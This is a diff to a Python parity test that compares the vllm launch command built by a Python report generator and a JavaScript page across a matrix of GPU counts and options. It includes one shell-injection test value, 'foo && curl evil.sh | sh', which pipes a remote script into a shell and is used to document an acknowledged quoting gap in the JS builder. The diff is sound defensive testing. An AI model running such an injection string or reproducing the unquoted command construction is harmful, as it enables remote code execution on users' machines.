@@ -9,6 +9,11 @@ the PDF — which the README calls procurement-ready — quietly wrong.
 
 Extracts compute() from generate_report.py without importing reportlab, runs
 computeInference() from index.html under node, and compares field by field.
+Also extracts build_vllm_cmd()/buildVllmCommand() — the emitted vllm command
+is a second code path in both engines, not covered by the compute() diff
+above, and it drifted the same way: above 8 GPUs, index.html split into
+TP/DP while generate_report.py kept emitting `--tensor-parallel-size` sized
+to the full GPU count with no DP flag at all.
 
 Run:  python3 tests/parity.test.py
 """
@@ -28,18 +33,25 @@ tree = ast.parse(src)
 # a plain assignment — an annotated one (PERF: dict = {...}) parses as AnnAssign,
 # gets skipped, and surfaces as a bare NameError from inside compute() much later.
 wanted = {"GIB", "GPUS", "PERF"}
+# build_vllm_cmd/split_parallelism don't close over any of the above (they take
+# cfg/comp as plain dicts and gpu_count as a plain int), so wanted stays as-is —
+# they just need to ride along in the same exec() so build_vllm_cmd can call
+# split_parallelism, plus shlex in ns below since build_vllm_cmd shells out to it.
+wanted_fns = {"compute", "build_vllm_cmd", "split_parallelism"}
 nodes = [
     n for n in tree.body
-    if (isinstance(n, ast.FunctionDef) and n.name == "compute")
+    if (isinstance(n, ast.FunctionDef) and n.name in wanted_fns)
     or (isinstance(n, ast.Assign)
         and any(getattr(t, "id", None) in wanted for t in n.targets))
 ]
-assert any(isinstance(n, ast.FunctionDef) for n in nodes), "compute() not found"
-ns = {"math": __import__("math")}
+for name in sorted(wanted_fns):
+    assert any(isinstance(n, ast.FunctionDef) and n.name == name for n in nodes), f"{name}() not found"
+ns = {"math": __import__("math"), "shlex": __import__("shlex")}
 exec(compile(ast.Module(body=nodes, type_ignores=[]), "<gr>", "exec"), ns)
 for name in sorted(wanted):
     assert name in ns, f"{name} not extracted from generate_report.py — is it still a top-level assignment?"
 compute, GPUS, PERF = ns["compute"], ns["GPUS"], ns["PERF"]
+build_vllm_cmd = ns["build_vllm_cmd"]
 
 # ---- run the JS model on the same inputs ----------------------------------
 CASES = [
@@ -232,6 +244,174 @@ else:
     else:
         print(f"  ok   GPU tables identical across both engines ({len(py_by_name)} cards)")
         passed += 1
+
+# ---- emitted vllm command, across a widened matrix -------------------------
+# Everything above compares compute() output — VRAM, throughput, verdicts —
+# but never the *command* either engine prints, which is a second code path
+# in both. It silently diverged above 8 GPUs: index.html split into TP/DP,
+# generate_report.py emitted `--tensor-parallel-size <n_gpu>` with no DP flag
+# at all. Driven straight off the pure builders (buildVllmCommand /
+# build_vllm_cmd) rather than through the full VRAM pipeline above — that
+# pipeline's agreement is already covered by CASES; this section is only
+# about the command string.
+#
+# gpu_count is crossed with prefix_caching in full (every count gets both).
+# That pairing is what caught generate_report.py never reading
+# prefix_caching at all — an earlier version of this matrix pinned
+# prefix_caching=True, exactly the one value where the two engines happened
+# to agree.
+#
+# A later review found that *rotating* a field is not the same as
+# *exercising its effect*, and this comment previously claimed the rotation
+# below closed that gap. It didn't, for three fields: fits was pinned True
+# (the "does not fit" short-circuit in both engines never ran), kv_bpp was
+# absent on the Python side while JS's kvBytesPerValue was hardcoded to 2
+# (so --kv-cache-dtype fp8 never appeared in either output — the exact
+# shape of the prefix_caching bug: a flag either engine can silently stop
+# emitting), and ctx equaled max_ctx_1 (so max-model-len's min() never had
+# to pick between two different operands — a min-to-max mutation would have
+# survived). is_moe also never paired with n_gpu == 1, so the n_gpu > 1
+# guard on --enable-expert-parallel went untested at the one count where
+# dropping it would matter. An overclaiming comment is worse than none,
+# because it tells the next reader not to look — so: fits, kv_bpp and ctx
+# (deliberately != max_ctx_1) are varied below, and EXTRA_CASES adds the
+# is_moe/n_gpu=1 pair plus two fits=False cases explicitly, rather than
+# crossing fits into the main grid where it would mostly just suppress
+# every other axis it landed on.
+#
+# quant and is_moe are indexed by g = i // 2 (which GPU_COUNTS entry this
+# is), not by i itself, so they vary independently of prefix_caching
+# (i % 2) instead of moving in lockstep with it — quant used to (i % 4),
+# which meant only 4 of the 8 (quant, prefix_caching) pairs ever occurred.
+GPU_COUNTS = [1, 2, 3, 6, 8, 12, 16, 17, 64, 100, 128, 256]
+PREFIX_CACHING_VALUES = [True, False]
+QUANT_VALUES = [None, "awq", "gptq", "gguf"]
+IS_MOE_VALUES = [False, True]
+KV_BPP_VALUES = [2, 1]  # BF16 vs FP8 KV cache -> --kv-cache-dtype fp8
+MAX_CTX_1 = 8192
+CTX_VALUES = [4096, 16384]  # one below MAX_CTX_1, one above — never equal to it
+# Benign but not a single constant either — rotated below. All shlex-safe
+# (word chars plus @%+=:,./-) so none of these brush up against the
+# shell-quoting asymmetry, which is handled separately by UNSAFE_HF_MODELS.
+HF_MODEL_VALUES = [
+    "/opt/models/YourModel",
+    "meta-llama/Llama-3.1-8B-Instruct",
+    "/mnt/nfs/models/team-a/checkpoint_v2.1",
+]
+# generate_report.py shell-quotes hf_model via shlex.quote() (see the
+# injection tests in report.test.py); index.html's buildVllmCommand() never
+# quotes anything, because the string it builds is only ever pasted back by
+# the same person who typed it into their own browser tab, not exec'd from a
+# shared file. The two engines are SUPPOSED to disagree on a value like this
+# today — that is a real gap, just not a TP/DP one, and out of scope here.
+# Naming and skipping it keeps that gap visible instead of it simply never
+# being tried.
+UNSAFE_HF_MODELS = ["foo && curl evil.sh | sh"]
+
+MATRIX = []
+i = 0
+for n in GPU_COUNTS:
+    for pc in PREFIX_CACHING_VALUES:
+        g = i // 2
+        MATRIX.append({
+            "n_gpu": n, "prefix_caching": pc, "fits": True,
+            "quant": QUANT_VALUES[g % len(QUANT_VALUES)],
+            "is_moe": IS_MOE_VALUES[(g // 4) % len(IS_MOE_VALUES)],
+            "kv_bpp": KV_BPP_VALUES[(g // 2) % len(KV_BPP_VALUES)],
+            "ctx": CTX_VALUES[g % len(CTX_VALUES)],
+            "hf_model": HF_MODEL_VALUES[g % len(HF_MODEL_VALUES)],
+            "skip_reason": None,
+        })
+        i += 1
+
+EXTRA_CASES = [
+    # is_moe=True paired with n_gpu=1: the grid above never produces this —
+    # is_moe only turns True once g >= 4, i.e. n_gpu >= 8 — so on its own it
+    # never tests the n_gpu > 1 / gpuCount > 1 guard on
+    # --enable-expert-parallel at the one count where dropping that guard
+    # would actually change the output (elsewhere, is_moe=True only ever
+    # co-occurs with n_gpu > 1 anyway, so the guard is a no-op there).
+    {"n_gpu": 1, "prefix_caching": True, "fits": True, "quant": None,
+     "is_moe": True, "kv_bpp": 2, "ctx": 8192,
+     "hf_model": "/opt/models/YourModel", "skip_reason": None},
+    # fits=False short-circuits both engines to the same constant string
+    # before n_gpu/quant/kv_bpp/ctx are ever read, so crossing it into the
+    # main grid would mostly waste those axes on a state where they don't
+    # show up. Two dedicated cases (different gpu_count/prefix_caching, so
+    # this isn't just one data point) are enough to catch either engine's
+    # message drifting from the other's.
+    {"n_gpu": 4, "prefix_caching": True, "fits": False, "quant": None,
+     "is_moe": False, "kv_bpp": 2, "ctx": 8192,
+     "hf_model": "/opt/models/YourModel", "skip_reason": None},
+    {"n_gpu": 12, "prefix_caching": False, "fits": False, "quant": "awq",
+     "is_moe": True, "kv_bpp": 1, "ctx": 4096,
+     "hf_model": "meta-llama/Llama-3.1-8B-Instruct", "skip_reason": None},
+]
+MATRIX.extend(EXTRA_CASES)
+
+for unsafe in UNSAFE_HF_MODELS:
+    MATRIX.append({
+        "n_gpu": 1, "prefix_caching": True, "fits": True, "quant": None,
+        "is_moe": False, "kv_bpp": 2, "ctx": 8192, "hf_model": unsafe,
+        "skip_reason": "known shell-quoting asymmetry (py quotes via shlex, js does not) — tracked separately, not TP/DP",
+    })
+
+py_cmds = [
+    build_vllm_cmd(
+        {"hf_model": m["hf_model"], "ctx": m["ctx"], "n_gpu": m["n_gpu"],
+         "quant": m["quant"], "prefix_caching": m["prefix_caching"],
+         "kv_bpp": m["kv_bpp"]},
+        {"fits": m["fits"], "is_moe": m["is_moe"], "max_ctx_1": MAX_CTX_1},
+    )
+    for m in MATRIX
+]
+
+js_cmd_runner = r"""
+const fs = require('fs');
+const html = fs.readFileSync(process.argv[1], 'utf8');
+function extract(sig) {
+  const s = html.indexOf(sig);
+  if (s === -1) throw new Error('not found in index.html: ' + sig);
+  const e = html.indexOf('\n}\n', s);
+  return html.slice(s, e + 2);
+}
+const src = extract('function splitParallelism(gpuCount) {')
+          + extract('function buildVllmCommand(state, computed, modelPath) {');
+const buildVllmCommand = new Function(`${src}; return buildVllmCommand;`)();
+const scenarios = JSON.parse(process.argv[2]);
+const MAX_CTX_1 = 8192; // must match Python's MAX_CTX_1 above
+console.log(JSON.stringify(scenarios.map((m) => buildVllmCommand(
+  {gpuCount: m.n_gpu, quantMethod: m.quant || '', kvBytesPerValue: m.kv_bpp,
+   prefixCaching: m.prefix_caching, contextLength: m.ctx},
+  {fits: m.fits, isMoE: m.is_moe, maxContextSingleUser: MAX_CTX_1},
+  m.hf_model))));
+"""
+proc = subprocess.run(
+    ["node", "-e", js_cmd_runner, os.path.join(ROOT, "index.html"), json.dumps(MATRIX)],
+    capture_output=True, text=True)
+if proc.returncode:
+    print("  FAIL node command runner failed:\n" + proc.stderr)
+    failed += 1
+else:
+    js_cmds = json.loads(proc.stdout)
+    for m, py_cmd, js_cmd in zip(MATRIX, py_cmds, js_cmds):
+        label = (f"n_gpu={m['n_gpu']} prefix_caching={m['prefix_caching']} fits={m['fits']} "
+                 f"quant={m['quant']!r} is_moe={m['is_moe']} kv_bpp={m['kv_bpp']} ctx={m['ctx']} "
+                 f"hf_model={m['hf_model']!r}")
+        if m["skip_reason"]:
+            print(f"  skip {label}")
+            print(f"       reason: {m['skip_reason']}")
+            if py_cmd != js_cmd:
+                print(f"       (confirmed still diverges — py: {py_cmd!r} js: {js_cmd!r})")
+            continue
+        if py_cmd != js_cmd:
+            print(f"  FAIL emitted vllm command differs ({label})")
+            print(f"       py: {py_cmd!r}")
+            print(f"       js: {js_cmd!r}")
+            failed += 1
+        else:
+            print(f"  ok   emitted vllm command matches ({label})")
+            passed += 1
 
 print(f"\n{passed} passed, {failed} failed\n")
 sys.exit(1 if failed else 0)
